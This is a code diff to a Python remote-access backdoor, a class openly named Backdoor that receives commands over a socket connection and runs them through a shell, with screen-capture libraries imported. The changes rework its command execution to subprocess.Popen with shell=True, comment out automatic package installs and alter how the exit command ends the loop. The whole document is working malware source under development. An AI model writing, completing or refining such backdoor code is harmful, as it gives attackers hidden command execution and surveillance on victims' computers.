@@ -2,10 +2,10 @@ import socket, json
 import subprocess
 import os
 import base64
-os.system("python -m pip install --upgrade pip")
-os.system("pip3 install mss")
-os.system("pip3 install numpy")
-os.system("pip3 install opencv-python")
+# os.system("python -m pip install --upgrade pip")
+# os.system("pip3 install mss")
+# os.system("pip3 install numpy")
+# os.system("pip3 install opencv-python")
 import mss
 import cv2
 
@@ -29,7 +29,13 @@ class Backdoor:
 
     def execute_system_command(self, command):
         try:
-            return subprocess.getoutput(command) #.decode("utf-8")
+            # out = subprocess.getoutput(command)
+            # print(out)
+            # return out #.decode("utf-8")
+            
+            proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
+            (out, err) = proc.communicate()
+            return str(out)
         except Exception as error:
             return error
 
@@ -58,7 +64,7 @@ class Backdoor:
             try:
                 if command.split()[0] == "exit":
                     self.connection.close()
-                    exit()
+                    break
                 elif command.split()[0] == "cd" and len(command) >= 2:
                     path = command.replace("cd ", "")
                     command_result = self.change_working_directory_to(path)
